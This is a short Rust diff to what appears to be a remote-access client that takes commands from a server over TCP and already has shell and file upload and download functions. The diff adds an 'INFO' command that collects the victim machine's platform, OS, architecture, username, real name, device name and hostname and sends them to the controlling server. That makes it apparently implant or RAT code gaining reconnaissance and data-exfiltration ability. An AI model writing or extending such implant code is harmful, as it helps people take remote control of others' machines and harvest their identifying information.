@@ -6,6 +6,7 @@ use std::path::Path;
 use std::time::Duration;
 
 use colored::Colorize;
+use whoami::fallible;
 
 use crate::{error, shell, success};
 use crate::files::{prep_download, receive_file, upload};
@@ -113,6 +114,13 @@ fn handle_server_response(stream: &mut TcpStream, response: String) -> Result<()
                     },
                     Err(e) => stream.write_all(e.to_string().as_bytes()).unwrap(),
                 };
+            }
+            "INFO" => {
+                let info = format!(
+                    "Platform: {}\nOS: {}\nCPU Arch: {}\nUsername: {}\nName: {}\nDevice name: {}\nHostname: {}",
+                    whoami::platform(), whoami::distro(), whoami::arch(), whoami::username(),  whoami::realname(), whoami::devicename(), fallible::hostname().unwrap_or(String::from("ERROR"))
+                );
+                stream.write_all(info.as_bytes()).unwrap();
             }
             "QUIT" => {
                 thread::sleep(Duration::from_millis(500));
